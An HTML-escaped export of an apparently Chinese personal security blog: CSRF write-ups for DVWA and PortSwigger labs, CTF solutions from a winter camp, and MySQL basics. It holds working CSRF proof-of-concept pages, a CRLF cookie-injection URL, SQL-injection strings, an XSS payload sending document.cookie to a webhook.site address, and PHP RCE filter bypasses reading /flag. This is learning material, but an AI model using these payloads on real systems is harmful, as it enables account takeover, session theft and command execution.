$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );            // Feedback for the user            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;        &#125;        else &#123;            // Issue with passwords matching            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;        &#125;    &#125;    else &#123;        // Didn&#x27;t come from a trusted source        echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt;

stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ])!=-1：检查当前请求的Referer头中是否包含当前服务器的域名。如果包含，则条件为真，表示请求来源于当前服务器；如果不包含，则条件为假，表示请求不是从当前服务器发出的
stripos()：这是一个字符串函数，用于在一个字符串中查找子字符串的位置，不区分大小写
综上，与low级别相比，该级别不能够跨域访问
但是只要在报头的referer处输入：127.0.0.1就可以成功绕过
所以同样我们抓包，构造poc，这次我们把密码改成admin007并保存为127.0.0.1.html文件

然后使用浏览器进行访问，点击提交请求后自动跳转到我们的页面，并且此时密码已被成功修改
High级别&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;    //用于检查令牌（Token）的有效性，以确保请求的合法性，如果令牌验证失败时要重定向的页面为index.php    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );    // Get input    $pass_new  = $_GET[ &#x27;password_new&#x27; ];    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) &#123;        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;//生成一个会话令牌，并将其存储在会话中generateSessionToken();?&gt;

经过分析发现High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求
CSRF防御之道1、尽量POST
GET太容易被CSRF攻击了，用POST可以降低风险，但也不能保证万无一失， 攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。
2、加入验证码
在POST的基础上可以再加一个验证码，用户每次提交数据时都需要在表单中填写验证码，这个方案大幅度的降低CSRF攻击，一些简单的验证码可能会被hacker破解，但一般情况下，验证码是很难被破解的。
3、验证Referer
就像上面的Medium级别那样，在验证时添加一个Referer，判断请求的来源地址是否是当前网页，如果是，则可以认为该请求是合法的，否则就拒绝用户请求。
4、Anti CSRF Token
CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于cookie中，因此攻击者可以在不知道用户验证信息的情况下直接利用用户的cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信总不存在于cookie之中。
在开发过程中我们可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务端进行token校验，如果请求中没有token或者token内容不正确，则认为是CSRF攻击而拒绝该请求
bp’s labLab：没有防御措施的 CSRF 漏洞题目提示电子邮件更改功能容易受到 CSRF 的攻击
所以我们登录账号之后转到电子邮件更改界面，进行抓包，将其发送到重放器中

可以看到报头中有referer，我们尝试删除并再次发送查看回显，发现一切正常，说明后端并没有验证referer
存在csrf漏洞，右键生成poc，复制html到bp的漏洞利用服务器中，可以自己先测试一下，但完成测试后要改一下邮箱地址，发送给受害者，题目解决
Lab：令牌验证取决于请求方法的 CSRF依旧是电子邮件更新功能容易受到攻击
登录账号之后转到电子邮件更改界面，进行抓包，将其发送到重放器中
这次有令牌进行验证，如下：

尝试直接修改令牌值，失败，更改邮箱请求被拒绝
标题：令牌验证取决于请求方法的 CSRF，给了我们另一种思路
我们尝试右键更改请求方式为get，然后对令牌值进行随意修改，请求成功，说明更改请求方式后后端没有验证令牌值
所以我们直接生成poc，复制html到bp的漏洞利用服务器中，送给受害者，题目解决
Lab：CSRF，其中令牌验证取决于令牌的存在依旧是电子邮件更新功能容易受到攻击
登录账号之后转到电子邮件更改界面，进行抓包，将其发送到重放器中
有令牌验证，但是根据标题中的令牌验证取决于令牌的存在这句话，尝试直接把令牌全部删除，发送请求成功
于是直接生成Poc，复制html到bp的漏洞利用服务器中，送给受害者，题目解决
Lab：令牌与用户会话无关的 CSRF此实验室的电子邮件更改功能容易受到 CSRF 的攻击。它使用令牌来尝试防止 CSRF 攻击，但它们没有集成到站点的会话处理系统中
这次我们拥有两个账号，首先登录一个账号并抓包，这次的令牌既不能修改，删除后也没有起到任何作用，更改请求方式也不行
查看代理模块的HTTP历史记录中的/my-account?id=wiener，检查后发现token值是在该条目中生成的，具体代码为：                           &lt;input required type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;MwT3m0JuawJpnibLHLd4XDpvLMw9GMWx&quot;&gt;
于是我们把这个token值复制到另一个账号的修改邮箱的抓包界面中替换一下，点击发送，请求成功
这说明了后端只检查令牌是否正确，没有检查令牌的来源是否是该用户
于是我们可以生成poc，复制html到bp的漏洞利用服务器中，需要注意，token一旦被使用过便不会再发挥作用，所以我们需要一个从来没有被用过的令牌
重新把更改邮箱的页面再加载一下，抓下包，获得新的token值，这时要注意不能把该请求放行，就把它挂在那边就好了，然后把得到的新的令牌值复制到代码里面，存储后发送给受害者，题目解决
Lab：令牌绑定到非会话 Cookie 的 CSRF&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;    &lt;form action=&quot;https://0a0000880458d70780af219200c400fa.web-security-academy.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;123456&amp;#64;123&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;dxpxBVZLqU1g14UUD2dv4omHuDneB7yH&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;    &lt;img src=&quot;https://0a0000880458d70780af219200c400fa.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ZfUOIWcnpwgpxoFwNzvS9oeXgQxA03PJ%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit()&quot;&gt;  &lt;/body&gt;&lt;/html&gt;



Lab：在 cookie 中复制令牌的 CSRF此实验室的电子邮件更改功能容易受到 CSRF 的攻击。它尝试使用不安全的“双重提交”CSRF 预防技术。
我们登录账号后更新邮箱，抓包，如下：
可以发现Cookie中的csrf和传参中的csrf是一样的，观察 到csrf body 参数的值是通过其与 csrf cookie 进行比较来验证，也就是说我们只需要这两个csrf的值一样便可以成功绕过
返回主页执行搜索功能，到代理中的HTTP历史记录中找到该条目，发送到重放器中，发送请求，回显如下：
发现搜索词反映在 Set-Cookie 标头中。由于搜索功能没有 CSRF 保护，可以使用它向受害者用户的浏览器注入 cookie
比如：/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None（有涉及到xss）
其中的 &#96;&#96;SameSite&#x3D;None：在默认情况下，浏览器在跨站请求（例如从一个网站向另一个网站发送请求）时不会发送第三方Cookie。这是浏览器的同源策略的一部分，旨在防止跨站请求伪造（CSRF）攻击和其他安全威胁。然而，有时候我们确实需要在跨站请求时发送Cookie，比如在使用单点登录（Single Sign-On）或者嵌入其他网站的资源（例如图片或iframe）时。这就需要使用SameSite&#x3D;None属性来解除浏览器的限制。当设置了SameSite&#x3D;None&#96;属性时，表示该Cookie可以在跨站请求中发送
于是我们构造poc如下：
&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;    &lt;form action=&quot;https://0ad300b7031c7394812e7087006a0086.web-security-academy.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;123456&amp;#64;123&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;fake&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;    &lt;img src=&quot;https://0ad300b7031c7394812e7087006a0086.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit();&quot;/&gt;  &lt;/body&gt;&lt;/html&gt;

保存，将其发送给受害者，题目解决
Lab：通过方法覆盖绕过 SameSite Lax在更改邮箱地址界面抓包，把抓到的发送到重放器中，发送，得到的响应头中有一条为：X-Frame-Options: SAMEORIGIN这说明了允许该页面在相同源（即相同域名）的 &lt;frame&gt;、&lt;iframe&gt; 或者 &lt;object&gt; 标签中加载
除此之外也没有任何的令牌来限制
查看响应发现网站在设置会话 cookie 时没有明确指定任何 SameSite 限制。因此，浏览器将使用默认的 Lax 限制级别，这意味着会话 cookie 将在跨站点 GET 请求中发送，只要它们涉及顶级导航
顶级导航：指的是浏览器的地址栏导航，即在浏览器的地址栏输入网址并按下回车，或者通过点击链接进行的页面跳转，这种跳转会改变浏览器的顶级窗口内容
于是我们尝试更改请求方式为get，然后发送，回显表示该页面只允许post传参
向get传参中添加 &amp;_method=POST：用于在HTML表单不支持的情况下模拟PUT、DELETE等HTTP方法。这种技术通常在RESTful风格的Web应用中使用，以绕过浏览器和HTML表单的限制
再次发送，成功，所以我们便可以在漏洞利用服务器中输入如下代码
&lt;script&gt;document.location=&quot;https://0a77000403d1fecd80be4987002a0052.web-security-academy.net/my-account/change-email?email=1236%40123&amp;_method=POST&quot;&lt;/script&gt;

保存并发送给受害者，题目解决
Lab：通过客户端重定向绕过 SameSite Strict首先在更改电子邮箱的界面抓包，把抓到的发送到重放器中

发送，得到的响应头中有一条为：X-Frame-Options: SAMEORIGIN
尝试更改请求方式为get，然后发送，回显说明修改电子邮箱成功，无需其他操作便可以成功修改，当时以为已经成功了，直接去漏洞利用服务器中写代码，发送给受害者，但是失败了，表明直接这样修改的话是行不通的
回到主页上进入任意一篇博客中进行评论，然后查看bp的代理模块中的HTTP历史记录，查看了 /post/comment/confirmation?postId=2，其响应中有好东西如下：
于是我们转去查看条目/resources/js/commentConfirmationRedirect.js，所需函数如下：
redirectOnConfirmation = (blogPath) =&gt; &#123;    setTimeout(() =&gt; &#123;        const url = new URL(window.location);        const postId = url.searchParams.get(&quot;postId&quot;);        window.location = blogPath + &#x27;/&#x27; + postId;    &#125;, 3000);&#125;

易得这是一个可以重定向页面的函数，上面的 blogPath为/post，postId为2，于是会重定向到相关的页面
根据这个函数我们可以联想到目录穿越，于是进行尝试：/post/comment/confirmation?postId=../../../my-account，成功重定向到该界面，接着尝试：/post/comment/confirmation?postId=../../../my-account/change-email?email=admin%40145623%26submit=1（特殊字符记得编码），成功修改邮箱
于是在漏洞利用服务器中可以写出如下代码：
&lt;script&gt;    document.location = &quot;https://0acd0042033dadfd81f92ff80050003c.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1&quot;;&lt;/script&gt;

保存，发送给受害者，题目解决
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>csrf</tag>
      </tags>
  </entry>
  <entry>
    <title>ROIS冬令营题解</title>
    <url>/2024/01/30/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3_max/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[1.http（极客大挑战）首先查看源码发现 &lt;a style=&quot;border:none;cursor:default;&quot; onclick=&quot;return false&quot; href=&quot;Secret.php&quot;&gt;，点击该链接
然后通过页面信息修改referer：https://Sycsecret.buuoj.cn
接着浏览器信息，即 User-Agent:Syclover，然后告诉我们要从本地查看，上网查找发现本地都是这个端口号 127.0.0.1，修改xxf，然后flag就出来了
2.查看网页的备份文件（攻防世界）php的备份文件有两种：*.php~和*.php.bak
例子：http://61.147.171.105:55767/index.php.bak
3.php2（攻防世界）对网址后面加上&#x2F;index.phps就可以查看页面php源码
例子：http://111.198.29.45:45191/index.phps
phps是php的源代码文件，但是不能接受传参，所以hackbar还是要在.php里面做
4.cookie（攻防世界）如何查看http响应
打开开发者工具，再点击网络(network)，选择你想要查看http响应的网址
这道题的flag位于标头里面
5.扫描目录用dirsearch（攻防世界）dirsearch -u &lt;URL&gt;是要扫描的目标网站的URL
可以用以下选项来调整扫描：
-e:指定要排除的扩展名
-f:指定要包含的扩展名
-x:指定要排除的目录
-t:指定线程数
例子：dirsearch -u https://example.com/ -f php,html -t 50（用50个线程扫描一个URL，只包括.php和.html文件）
dirsearch -u https://example.com/ -o result.txt

将扫描结果保存到result.txt文件中
6.easy-PDD这道题先用bp抓包，然后用bp中的爆破模式，也就是Intruder模式来发送好多好多的请求包，得到flag
具体爆破模式操作步骤可以参考：https://blog.csdn.net/FTQOOO/article/details/103822526
7.ez_maze分析：弹出警告框是因为鼠标的移动碰到了迷宫的线导致的，就是js中的onmouseover事件，所以有以下几种解法
第一种：玩通关，实践过可以的，难度还行
第二种：通过弹出警告框后鼠标怎么移动都没有事情，可以借此先把鼠标移至红点区域，然后按回车键，再触碰红点就得到flag了
第三种：用手机进入这个网址，然后直接点红点
第四种：通过源码的逻辑来，等待有缘人ing
8.Matryoshka doll下载文件完后把那个文件的内容疯狂拿去转码，解码，需要多种，比如base64解码，urldecode等，可以借助gpt帮帮忙
9.三题sql注入easy：账号名使用万能密钥 1&#39; or 1=1；然后密码随便输入一个
normal：按照正常的union注入来进行操作，需要注意的是只会回显第二个字段，所以所有操作要在 select 1,2,3的2处进行
hard：使用布尔盲注，最好使用脚本来，嗖嗖爆出所需东西，需要注意的是账号密码的name属性分别是username，password
10.xss-1function report()&#123;		document.location = `http://$&#123;document.location.hostname&#125;:8001/report.html?e=`+btoa(document.querySelector(&#x27;#input-textarea&#x27;).value)	&#125;	function execute(payload)&#123;		try&#123;			let parsed = acorn.parse(payload, &#123; ecmaVersion: &#x27;latest&#x27; &#125;).body;			alert(eval(payload));		&#125; catch(e)&#123; 			alert(&#x27;Error: &#x27;+e);		&#125;	&#125;	window.onload = _=&gt;&#123;		let p = (new URLSearchParams(document.location.search)).get(&#x27;e&#x27;);		if(p) execute(atob(p));	&#125;

上述代码理解透彻即可做出题目（透彻！！！）
payload：window.open(&#39;https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2?&#39;+document.cookie)
11.unserialize-1&lt;?php$flag = &#x27;ROIS&#123;test&#125;&#x27;;class Name&#123;    public $name;    public $password;    public function __get($name) &#123;        echo $this-&gt;name;        return $name;    &#125;    public function __wakeup() &#123;        if($this-&gt;password!=null)&#123;            echo $this-&gt;password;        &#125;        else&#123;            echo $this-&gt;name;        &#125;    &#125;    public function __toString() &#123;        global $flag;        echo $flag;        return &quot;nice&quot;;    &#125;&#125;unserialize($_GET[&#x27;input&#x27;]);

__toString()必须在echo对象的情况下才能够自动使用，所以要一个对象要包含另一个对象，这两个对象同属于一个类里面，代码如下
&lt;?php$flag = &#x27;ROIS&#123;test&#125;&#x27;;class Name&#123;    public $name;    public $password;    public function __construct($name,$password)&#123;        $this-&gt;name = $name;        $this-&gt;password = $password;&#125;&#125;$a = new Name(&#x27;John&#x27;,&#x27;222&#x27;);$input = new Name(&#x27;Joe&#x27;,$a);echo serialize($input);

序列化后的字符串：O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Joe&quot;;s:8:&quot;password&quot;;O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;John&quot;;s:8:&quot;password&quot;;s:3:&quot;222&quot;;&#125;&#125;
然后 ?input=O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Joe&quot;;s:8:&quot;password&quot;;O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;John&quot;;s:8:&quot;password&quot;;s:3:&quot;222&quot;;&#125;&#125;，得到flag
12.ez_rce_plus?&lt;?phphighlight_file(__FILE__);if (@$_SERVER[&#x27;HTTP_KEY&#x27;] !== &quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;)    die(&quot;authentication failed!!&quot;);else&#123;    $nameFunction = htmlspecialchars(@$_POST[&quot;function&quot;]); unset($_POST[&quot;function&quot;]);    if(!$nameFunction) $nameFunction = htmlspecialchars(@$_POST[&quot;action&quot;]); unset($_POST[&quot;action&quot;]);    $nameFunction = waf($nameFunction);    $nameFunction = explode(&quot;/&quot;,$nameFunction);    $nameFunction = $nameFunction[1];    if($nameFunction)&#123;        $params = array();        forEach($_POST as $key =&gt; $item)&#123;            $item = waf($item);            array_push($params, $item); unset($_POST[$key]);        &#125;        $base64 = false; if(isset($_SERVER[&quot;HTTP_BASE64&quot;]))&#123; $base64 = $_SERVER[&quot;HTTP_BASE64&quot;] === &#x27;true&#x27; ? true : false; &#125;        $params = join(&quot;&#x27;,&#x27;&quot;, $params); $eval = $nameFunction.&quot;(&#x27;&quot;.$params.&quot;&#x27;)&quot;; $return = eval(&#x27;return &#x27;.$eval.&quot;;&quot;); echo jsonEncode($return, $base64);    &#125;&#125;function jsonEncode($value, $base64_encode = true)&#123;    $value = json_encode($value, JSON_PRETTY_PRINT);    if($base64_encode) $value = base64_encode($value);    return $value;&#125;function waf($input) &#123;    $blacklist = [&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;flag&#x27;];    foreach ($blacklist as $word) &#123;        $input = str_replace($word, &#x27;&#x27;, $input);    &#125;    return $input;&#125;

源码看懂那就不是个事
unset() 函数用于销毁指定变量
explode() 函数会将字符串按照指定的分隔符拆分成数组

forEach($_POST as $key =&gt; $item) 遍历了 $_POST 数组中的每个键值对，其中 $key 是键名，$item 是对应的值。
对每个 $item 值应用了 waf() 函数进行过滤，过滤后的结果存储回 $item 变量中。
使用 array_push($params, $item) 将过滤后的结果添加到了 $params 数组中。
使用 unset($_POST[$key]) 删除了原始 $_POST 数组中相应的键值对，以确保只保留了过滤后的数据

使用 join() 函数将数组 $params 中的元素以逗号连接成一个字符串，并且在每个元素之间添加了单引号
以下内容为反推回去的思路
$eval=system(&#x27;ls /&#x27;)$params=ls /$nameFunction=system$nameFunction=1/sysystemstemfunction=action=1/sysystemstema=ls /

所以最终post的内容如下所示：
function=1/sysystemstem&amp;action=1/sysystemstem&amp;a=ls /

得到flag位置后 function=1/sysystemstem&amp;action=1/sysystemstem&amp;a=cat /flflagag
13.ez_rce_with_full_waf?与12题的代码差不多，其中的waf()函数改为了下面所示：
function waf($input) &#123;    $blacklist = [&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;flag&#x27; ,&#x27;`&#x27; ,&#x27;eval&#x27; ,&#x27;call&#x27; ,&#x27;$&#x27; ,&#x27;php&#x27; ,&#x27;require&#x27; , &#x27;_&#x27; , &#x27;file&#x27; ,&#x27;show&#x27; , &#x27;include&#x27;, &#x27;\&#x27;&#x27; , &#x27;&quot;&#x27; , &#x27;.&#x27;  , &#x27;&lt;&#x27; , &#x27;&gt;&#x27; ];    foreach ($blacklist as $word) &#123;        $input = str_replace($word, &#x27;hack!&#x27;, $input);    &#125;    return $input;&#125;

我们可以通过不给function赋值，给action赋值绕过第一个waf：action=1/system&amp;a=ls /
第二个waf我们可以通过通配符来绕过：action=1/sysystemstem&amp;a=cat /fl??，得到最终的flag
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>MySQl</title>
    <url>/2023/10/08/MySQl%20%20max/MySQl/</url>
    <content><![CDATA[在MySQL中最好所有数据都用英文表示，中文实在搞不成功！！！
数据库的三种类型：层次模型，网状模型，关系模型。
数据类型关系数据库支持的标准数据类型包括数值、字符串、时间等

操作数据库的能力DDL：Data Definition Language
DDL允许用户定义数据，也就是创建表、删除表、修改表结构这些操作。通常，DDL由数据库管理员执行。
DML：Data Manipulation Language
DML为用户提供添加、删除、更新数据的能力，这些是应用程序对数据库的日常操作。
DQL：Data Query Language
DQL允许用户查询数据，这也是通常最频繁的数据库日常操作。
语法特点SQL语言关键字不区分大小写！！！但是，针对不同的数据库，对于表名和列名，有的数据库区分大小写，有的数据库不区分大小写。同一个数据库，有的在Linux上区分大小写，有的在Windows上不区分大小写。
关系模型表的每一行称为记录（Record），记录是一个逻辑意义上的数据。
表的每一列称为字段（Column），同一个表的每一行记录都拥有相同的若干字段。
字段定义了数据类型（整型、浮点型、字符串、日期等），以及是否允许为NULL。注意NULL表示字段数据不存在。一个整型字段如果为NULL不表示它的值为0，同样的，一个字符串型字段为NULL也不表示它的值为空串’ ‘。
通常情况下，字段应该避免允许为NULL。不允许为NULL可以简化查询条件，加快查询速度，也利于应用程序读取数据后无需判断是否为NULL。
在关系数据库中，关系是通过主键和外键来维护的。
主键对于关系表，有个很重要的约束，就是任意两条记录不能重复。不能重复不是指两条记录不完全相同，而是指能够通过某个字段唯一区分出不同的记录，这个字段被称为主键。（主键不能够一样）
对主键的要求，最关键的一点是：记录一旦插入到表中，主键最好不要再修改，因为主键是用来唯一定位记录的，修改了主键，会造成一系列的影响。
选取主键的一个基本原则是：不使用任何业务相关的字段作为主键。（手机号码，身份证号码，邮箱地址皆不行）
主键的字段一般命名为id，常见可做id字段类型的类型有：
1.自增整数类型：数据库会在插入数据时自动为每一条记录分配一个自增整数，这样我们就完全不用担心主键重复，也不用自己预先生成主键；
2.全局唯一GUID类型：使用一种全局唯一的字符串作为主键。
联合主键：关系数据库实际上还允许通过多个字段唯一标识记录，即两个或更多的字段都设置为主键
对于联合主键，允许一列有重复，只要不是所有主键列都重复即可。（一般不使用联合主键，避免更加复杂）
外键
多对多通过一个表的外键关联到另一个表，我们可以定义出一对多关系。有些时候，还需要定义“多对多”关系。例如，一个老师可以对应多个班级，一个班级也可以对应多个老师，因此，班级表和老师表存在多对多关系。
多对多关系实际上是通过两个一对多关系实现的，即通过一个中间表，关联两个一对多关系，就形成了多对多关系：

一对一一对一关系是指，一个表的记录对应到另一个表的唯一一个记录。
总的：关系数据库通过外键可以实现一对多、多对多和一对一的关系。外键既可以通过数据库来约束，也可以不设置约束，仅依靠应用程序的逻辑来保证。
索引索引是关系数据库中对某一列或多个列的值进行预排序的数据结构。

唯一索引

导入数据先创建database(例子：create database 文件名;)
然后 sorce 文件路径；例子：source C:\Users\BD\MySQLwenjian\bilibili.sql;注意路径中不要有中文
只看表的结构desc &lt;表名&gt;;
查询数据基本查询查询数据库表的数据：SELECT * FROM 表名；
SELECT 也可以用于计算（例如：SELECT 100 + 200；）
条件查询基本SELECT语句通过WHERE条件来设定查询条件:SELECT * FROM &lt;表名&gt; WHERE &lt;条件表达式&gt;
（例如：SELECT * FROM students WHERE score&gt;=80;)
条件表达式:1.**&lt;条件1&gt; AND &lt;条件2&gt;**表达满足条件1并且满足条件2
​                    2.**&lt;条件1&gt; OR &lt;条件2&gt;**表示满足条件1或者满足条件2
​                    3**. NOT &lt;条件&gt;**，表示“不符合该条件”的记录(例如：写一个“不是2班的学生”这个条件：NOT class_id &#x3D; 2：)
​                         要组合三个或者更多的条件，就需要用小括号()表示如何进行条件运算
​                      （例：SELECT * FROM students WHERE (score &lt; 80 OR score &gt; 90) AND gender &#x3D; ‘M’;）
如果不加括号，条件运算按照NOT、AND、OR的优先级进行，即NOT优先级最高，其次是AND，最后是OR

模糊查询like;支持%或下划线匹配
%匹配任意多个字符；下划线是任意一个字符
例子：SELECT ename from emp where ename like&#39;%o%&#39;;（表示名字中间含’O’的）
​           SELECT ename from emp where ename like&#39;%T&#39;;（表示名字以’T’结尾）
​          SELECT ename from emp where ename like&#39;_A%&#39;;（表示第二个字母是’A’）
子查询where中的子查询例子：找出比最低工资高的员工
SELECT ename,sal FROM emp WHERE sal&gt;(SELECT min(sal) FROM emp);
from子句中的子查询from后面的子查询，可以将子查询的查询结果当作一张临时表（技巧）
例子：找出每个岗位的平均工资的薪资等级
SELECT
t,s.grade
from
(select job,avg(sal) avgsal from emp group by job) t
join
salgrade s
on
t.avgsal between s.losal and s.hisal;
select后的子查询了解了解就好
注意：对于select后面的子查询来说，这个子查询只能一次返回一条结果，多余一条就会报错
投影查询如果我们只希望返回某些列的数据，而不是所有列的数据，我们可以用SELECT 列1, 列2, 列3 FROM …，让结果集仅包含指定列。这种操作称为投影查询。（例：SELECT id，name,score FROM students;)
使用SELECT 列1, 列2, 列3 FROM …时，还可以给每一列起个别名，这样，结果集的列名就可以与原表的列名不同。它的语法是SELECT 列1 别名1, 列2 别名2, 列3 别名3 FROM …
投影查询同样可以接WHERE条件，实现复杂的查询
总的应用一下：SELECT id, score points, name FROM students WHERE gender = &#39;M&#39;;
排序如果要按我们自己的排序而不是按主键排序则加上ORDER语句
SELECT id, name, gender, score FROM students ORDER BY score;
如果要反过来，按照成绩从高到底排序，我们可以加上DESC表示“倒序”（DESC加在score后面），如果score列有相同的数据那么可以继续添加列名
如果有WHERE子句，那么ORDER BY子句要放到WHERE子句后面
SELECT id, name, gender, score FROM students WHERE class_id = 1 ORDER BY score DESC;（多个字段排序字段之间加’,’  ，前面起主导作用）
分页查询使用SELECT查询时，如果结果集数据量很大，比如几万行数据，放在一个页面显示的话数据量太大，不如分页显示，每次显示100条。
要实现分页功能，实际上就是从结果集中显示第1100条记录作为第1页，显示第101200条记录作为第2页，以此类推。
语句：LIMIT &lt;N-M&gt; OFFSET &lt;M&gt;（表示为每页最多显示几个数据）
例子：SELECT id, name, gender, score           FROM students           ORDER BY score DESC           LIMIT 3 OFFSET 0;
LIMIT 3 OFFSET 0表示，对结果集从0号记录开始，最多取3条。注意SQL记录集的索引从0开始。
如果要查询第2页，那么我们只需要“跳过”头3条记录，也就是对结果集从3号记录开始查询，把OFFSET设定为3。
注意：OFFSET是可选的，如果只写LIMIT 15，那么相当于LIMIT 15 OFFSET 0；
​            在MySQL中，LIMIT 15 OFFSET 30还可以简写成LIMIT 30, 15；
​           OFFSET超过了查询的最大数量并不会报错，而是得到一个空的结果集。
聚合查询对于统计总数、平均数这类计算，SQL提供了专门的聚合函数，使用聚合函数进行查询，就是聚合查询
查询一个表中一共有多少条记录可以用COUNT()函数（SELECT COUNT(*) FROM students;）
使用聚合查询时，我们应该给列名设置一个别名，便于处理结果（SELECT COUNT(*) num FROM students;）
count(*)与count(具体字段)的区别：前一个统计总行数，后一个统计该字段下所有不为NULL的元素总和
聚合查询同样可以使用WHERE条件

其他聚合函数

AVG：SELECT AVG(score) average FROM students WHERE gender = &#39;M&#39;;
注意：聚合函数自动忽略NULL
​			聚合函数不能直接用在WHERE子句中，因为聚合函数在使用时必须先分组才能使用
如果聚合查询的WHERE条件没有匹配到任何行，COUNT()会返回0，而SUM()、AVG()、MAX()和MIN()会返回NULL
每页3条记录，如何通过聚合查询获得总页数：SELECT CEILING(COUNT(*) &#x2F; 3) FROM students;
多表查询语法：：SELECT * FROM &lt;表1&gt;， &lt;表2&gt;
这种一次查询两个表的数据，查询的结果也是一个二维表，它是students表和classes表的“乘积”，即students表的每一行与classes表的每一行都两两拼在一起返回。结果集的列数是students表和classes表的列数之和，行数是students表和classes表的行数之积
上述查询的结果集有两列id和两列name，两列id是因为其中一列是students表的id，而另一列是classes表的id，但是在结果集中，不好区分。两列name同理；要解决这个问题，我们仍然可以利用投影查询的“设置列的别名”来给两个表各自的id和name列起别名
例子：
`SELECT`    `students.id sid,`       多表查询时，要使用**表名.列名**这样的方式来引用列和设置别名，这样就避免了结果集的列名重复问题     `students.name,`    `students.gender,`    `students.score,`    `classes.id cid,`    `classes.name cname``FROM students, classes;`

FROM子句给表设置别名的语法是FROM &lt;表名1&gt;  &lt;别名1&gt;, &lt;表名2&gt;  &lt;别名2&gt;（使得投影查询更加的简洁）
连接查询连接查询是另一种类型的多表查询。连接查询对多个表进行JOIN运算，简单地说，就是先确定一个主表作为结果集，然后，把其他表的行有选择性地“连接”在主表结果集上。
笛卡尔积现象：当两张表进行连接查询且没有任何条件限制的时候，最终的查询条数是两张表条数的乘积
